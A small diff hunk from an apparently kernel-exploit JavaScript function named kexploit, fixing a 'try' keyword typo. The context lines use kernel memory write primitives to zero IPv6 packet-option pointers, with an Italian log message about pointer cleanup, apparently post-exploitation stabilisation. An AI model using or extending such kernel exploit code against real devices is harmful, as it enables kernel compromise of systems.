@@ -1791,7 +1791,7 @@ export async function kexploit() {
 
 
 
-    ry {
+    try {
     log("Pulizia puntatori pktopts...");
     kmem.write64(m_pktopts.add(0x10), 0); // ip6po_pktinfo
     kmem.write64(m_pktopts.add(0x18), 0); // ip6po_nhinfo
